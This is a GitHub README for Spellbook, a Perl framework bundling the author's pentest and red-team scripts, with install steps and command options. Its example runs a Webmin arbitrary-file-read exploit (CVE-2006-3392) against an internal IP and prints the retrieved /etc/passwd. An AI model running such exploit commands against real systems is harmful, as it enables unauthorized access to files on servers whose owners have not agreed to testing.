<p align="center">
  <img src="https://heitorgouvea.me/images/projects/spellbook/logo.png" width="150px" height="150px">
  <h3 align="center"><b>Spellbook</b></h3>
  <p align="center">A micro-framework for rapid development of reusable security tools</p>
  <p align="center">
    <a href="https://github.com/htrgouvea/spellbook/blob/master/LICENSE.md">
      <img src="https://img.shields.io/badge/license-MIT-blue.svg">
    </a>
    <a href="https://github.com/htrgouvea/spellbook/releases">
      <img src="https://img.shields.io/badge/version-0.0.7-blue.svg">
    </a>
  </p>
</p>

---

### Summary

Here you will find a "spellbook" with my personal scripts, exploits and other small things I wrote during my bug hunting jorney, pentesting or red teaming missions. Like any other spellbook, some things here are not going to be very easy to understand, it couldn't be different, right?

The main focus of this "micro-framework" is to keep my personal scripts organized and make them available in a structure where I can reuse the code that has already been written to write something else. Furthermore, the Spellbook is just a research project that so far is no big deal and does not replace a truly robust framework.

---

### Download and install

```
  # Download
  $ git clone https://github.com/htrgouvea/spellbook && cd spellbook

  # Install libs and dependencies
  $ cpan install Getopt::Long Mojo::File Mojo::JSON
```

---

### How to use

```
Spellbook v0.0.7
Core Commands
==============
	Command          Description
	-------          -----------
	-s, --search     List modules, you can filter by category
	-m, --module     Set a module to use
	-t, --target     Set a target
	-p, --parameter  Set a value for a module parameter
```

### Example

```bash
# Searching for exploits 
$ perl spellbook.pl --search exploits

Module: Exploits::CVE_2017_5487
Category: exploits
Description: Read usernames leaked on WordPress API
=================================================

Module: Exploits::CVE_2006_3392
Category: exploits
Description: Read arbitrary files for servers running Webmin before 1.290 and Usermin before 1.220
=================================================
...

# Using an exploit
$ perl spellbook.pl -m Exploits::CVE_2006_3392 -t http://172.30.0.15:10000/ -p /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
...
```

---

### Contribution

- Your contributions and suggestions are heartily ♥ welcome. [See here the contribution guidelines.](/.github/CONTRIBUTING.md) Please, report bugs via [issues page](https://github.com/htrgouvea/spellbook/issues) and for security issues, see here the [security policy.](/SECURITY.md) (✿ ◕‿◕) This project follows the best practices defined by this [style guide](https://heitorgouvea.me/projects/perl-style-guide).

---

### License

- This work is licensed under [MIT License.](/LICENSE.md)